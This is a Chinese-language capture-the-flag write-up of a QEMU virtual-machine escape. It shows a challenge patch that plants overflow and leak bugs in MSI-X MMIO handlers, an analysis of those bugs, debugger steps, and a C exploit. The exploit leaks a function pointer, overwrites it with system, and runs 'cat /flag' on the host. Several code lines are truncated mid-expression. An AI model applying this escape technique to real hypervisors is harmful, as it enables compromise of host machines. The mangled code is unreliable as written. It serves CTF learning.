    +    //bool was_masked;
    -    was_masked = msix_is_masked(dev, vector);
    -    pci_set_long(dev->msix_table + addr, val);
    -    msix_handle_mask_update(dev, vector, was_masked);
    +    //was_masked = msix_is_masked(dev, vector);
    +    //pci_set_long(dev->msix_table + addr, val);
    +    //msix_handle_mask_update(dev, vector, was_masked);
    +    if(size == 1){
    +    char value = val;
    +        switch(dev->crypt.statu){
    +            case 1:
    +            dev->crypt.statu = value;
    +        break;
    +        case 2:
    +        dev->crypt.mode = value;
    +        break;
    +        case 3:
    +        dev->crypt.crypt_func = crypt_exe_func;
    +        break;
    +        default:
    +        break;
    +        }
    +    }
     }
     static const MemoryRegionOps msix_table_mmio_ops = {
    @@ -214,12 +286,64 @@
             dev->msix_vector_poll_notifier(dev, vector_start, vector_end);
         }
    -    return pci_get_long(dev->msix_pba + addr);
    +    char value;
    +    switch(addr){
    +        case 1:
    +        dev->crypt.statu = 1;
    +        break;
    +    case 2:
    +        memset(dev->crypt.key,0,0x80);
    +        memset(dev->crypt.input,0,0x80);
    +        memset(dev->crypt.output,0,0x80);
    +        break;
    +    default:
    +        if(dev->crypt.statu == 1){
    +            if(addr >= 0x10 + strlen(dev->crypt.key) || (size != 1)){
    +            return 0;
    +        }
    +        value = dev->crypt.key[addr-0x10];
    +        }
    +        else if(dev->crypt.statu == 2){
    +            if(addr >= 0x90 + strlen(dev->crypt.input) || (size != 1)){
    +            return 0;
    +        }
    +        value = dev->crypt.input[addr-0x90];
    +        }
    +        else{
    +            if(addr >= 0x110 + strlen(dev->crypt.output) || (size != 1)){
    +            return 0;
    +        }
    +        value = dev->crypt.output[addr-0x110];
    +        }
    +        break;
    +    }
    +    return value;
    +    //return pci_get_long(dev->msix_pba + addr);
     }
     static void msix_pba_mmio_write(void *opaque, hwaddr addr,
                                     uint64_t val, unsigned size)
     {
    +    PCIDevice *dev = opaque;
    +    if(size == 1){
    +    char value = val;
    +        switch(dev->crypt.statu){
    +        case 1:
    +        if(addr >= 0x80){
    +            return;
    +        }
    +        dev->crypt.key[addr] = value;
    +        break;
    +        case 2:
    +        if(addr = 0x100){
    +            return;
    +        }
    +        dev->crypt.input[addr-0x80] = value;
    +        break;
    +        default:
    +        break;
    +        }
    +    }
     }
     static const MemoryRegionOps msix_pba_mmio_ops = {
    @@ -288,7 +412,8 @@
         }
         table_size = nentries * PCI_MSIX_ENTRY_SIZE;
    -    pba_size = QEMU_ALIGN_UP(nentries, 64) / 8;
    +    //pba_size = QEMU_ALIGN_UP(nentries, 64) / 8;
    +    pba_size = 0x200;
         /* Sanity test: table & pba don't overlap, fit within BARs, min aligned */
         if ((table_bar_nr == pba_bar_nr &&
通过分析，得出其各部分功能  
1、crypt_en_func/crypt_de_func：使用strlen函数获取input和key数组的长度，进行抑或后将结果赋值给ouput  
2、crypt_exe_func：调用crypt_en_func/crypt_de_func函数  
3、msix_table_mmio_read：
  * statu=1时，返回statu  
statu=2时，返回mode  
statu=3时，调用crypt_func函数指针
4、msix_table_mmio_write：size=1
  * statu=1时，statu=value更新状态statu  
statu=2时，mode=value  
statu=3时，将crypt_func赋值为crypt_exe_func指针
5、 msix_pba_mmio_read：
  * addr=1时，statu=1  
addr=2时，初始化key、input、output  
else：size=1
    * statu=1时，判断addr是否大于等于strlen(key)，符合的话就返回key[addr-0x10]  
statu=2时，判断addr是否大于等于strlen(input)，符合的话就返回input[addr-0x90]  
else，判断addr是否大于等于strlen(output)，符合的话就返回output[addr-0x110]  
注意key、input、ouput大小都为0x80，所以可以认为他们起始的地址都是key[addr-0x10]
6.、msix_pba_mmio_write：size=1
  * statu=1时，判断addr大小，key[addr]=value  
statu=2时，判断addr大小，input[addr-0x80]=value
通过以上分析可以看出漏洞点
  * crypt_en_func/crypt_de_func函数使用strlen获取数组长度，若key和input数组填满，可以将output溢出到crypt_func
  * msix_pba_mmio_read函数中，同样使用的是strlen判断数组长度，因此可以泄露读取crypt_func函数地址
利用思路为
  1. 将key和input数组填满，调用crypt_en_func填满output数组，泄露crypt_func函数指针，计算得到system函数地址
  2. 将key和input数组填满，溢出覆盖crypt_func函数指针为system函数
  3. 在key数组中写入”cat flag“指令，并调用crypt_func函数
## Step3：编写exp
在覆盖crypt_func函数指针时，写入的值是通过key与output前8个字节进行抑或得到的，而output是通过key与input前8个字节得到的，也就是说我们写入的addr是通过key两次抑或的结果。我们知道，`value^key^key==value`，因此如果0x80是key的长度与8的公倍数，必然会导致addr=input，但是这样一来strlen(input) file qemu-system-x86_64
    pwndbg > attach [PID]
    #获取程序基址
    pwndbg > vmmap
    pwndbg > b *[elf_base+0x4FA2D2]
    pwndbg > c
加解密前
加解密后
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include
    uint32_t mmio_size = 0x1000;
    unsigned char* mmio_mem;
    void die(const char* msg)
    {
        perror(msg);
        exit(-1);
    }
    void mmio_write(uint32_t addr, uint8_t value)
    {
        *((uint8_t *)(mmio_mem + addr)) = value;
    }
    uint8_t mmio_read(uint32_t addr)
    {
        return *((uint8_t*)(mmio_mem + addr));
    }
    void set_statu(uint8_t value)
    {
        mmio_read(0x800+1);
        mmio_write(0,value);
    }
    void set_cryptfunc(){
        set_statu(3);
        mmio_write(0,0);
    }
    void call_cryptfunc(){
        set_statu(3);
        mmio_read(0);
    }
    void set_mode(uint8_t value){
        set_statu(2);
        mmio_write(0,value);
    }
    void set_key(uint32_t addr, uint8_t value)
    {
        mmio_read(0x800+1);
        mmio_write(addr+0x800,value);
    }
    void set_input(uint32_t addr, uint8_t value)
    {
        set_statu(2);
        mmio_write(addr+0x800+0x80,value);
    }
    void reset(){
        mmio_read(0x800+2);
    }
    char get_key(uint32_t addr){
        set_statu(1);
        return mmio_read(addr+0x800+0x10);
    }
    char get_input(uint32_t addr){
        set_statu(2);
        return mmio_read(addr+0x800+0x90);
    }
    char get_output(uint32_t addr){
        set_statu(3);
        return mmio_read(addr+0x800+0x110);
    }
    int main(int argc, char *argv[])
    {
        int fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource4", O_RDWR | O_SYNC);
        if (fd == -1)
            die("mmio_fd open failed");
        mmio_mem = mmap( NULL, mmio_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd,0 );
        if ( !mmio_mem ) {
            die("mmap mmio failed");
        }
        //Step1: leak func addr
        char buf[0x10]={0};
        set_key(0,0x41);
        for(int i=0;i system
        set_key(0,0x1);
        set_key(1,0x2);
        set_key(2,0x3);
        set_key(3,0x4);
        set_key(4,0x5);
        set_key(5,0x6);
        size_t tmp_addr = system^0x0201060504030201^0x0403020106050403;
        for(int i=0;i>(i*8);
            set_input(i,tmp);
        }
        call_cryptfunc();
        //Step3：write cat /flag to key
        set_key(0,0x63);
        set_key(1,0x61);
        set_key(2,0x74);
        set_key(3,0x20);
        set_key(4,0x2f);
        set_key(5,0x66);
        set_key(6,0x6c);
        set_key(7,0x61);
        set_key(8,0x67);
        call_cryptfunc();
        return 0;
    }
成功实现qemu逃逸
## 总结
首先感谢V1NKe大佬给我分享一些做qemu的思路。一般先定位region，从realize函数初始化的region下手；或者可以从设备的具体作用及其与其他机制间的交互联系下手进行定位分析。
## Reference
[MSI-X介绍](https://blog.csdn.net/linjiasen/article/details/105858038)  
[msix_patch.diff](https://github.com/Nu1LCTF/n1ctf-2020/blob/main/PWN/Kemu/Source/msix_patch.diff)  
[linux里的nvme驱动代码分析](https://blog.csdn.net/panzhenjie/article/details/51581063)